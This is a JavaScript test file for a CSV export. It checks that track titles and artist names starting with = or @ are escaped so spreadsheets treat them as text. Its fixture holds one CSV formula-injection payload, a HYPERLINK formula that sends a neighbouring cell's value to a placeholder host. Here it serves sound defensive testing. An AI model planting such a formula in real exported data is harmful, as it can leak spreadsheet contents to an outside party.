// Captured titles are written by strangers (an "original audio" title is whatever the creator
// typed). In the CSV they must stay text: a spreadsheet runs a cell starting with = + - @ as a
// formula, and formulas can load web addresses.
import { EXT_DIR } from '../ext-dir.mjs';
import { suite } from '../check.mjs';

const { check, done } = suite();
const { csvText } = await import(EXT_DIR + 'exports.js');

const track = (key, title, artist) => ({ key, kind: 'audio', title, artist, posts: [], areas: { explore: 1 }, first_seen: 1000, last_seen: 1000 });
const csv = csvText({ matches: {}, excluded: {}, playlist: null, tracks: {
  a: track('a', '=HYPERLINK("https://x.example/?"&B2,"Click")', '@me'),
  b: track('b', 'Love Me Do', 'The Beatles'),
} });
const rows = csv.split('\n');

check('a title starting with = is kept as text', csv.includes(`"'=HYPERLINK(""https://x.example/?""&B2,""Click"")"`), rows[1]);
check('an artist starting with @ is kept as text', csv.includes(",'@me,"), rows[1]);
check('ordinary titles are unchanged', csv.includes(',Love Me Do,The Beatles,'), rows[2]);
check('numbers are unchanged', /,0,1,/.test(rows[2]), rows[2]);

done();
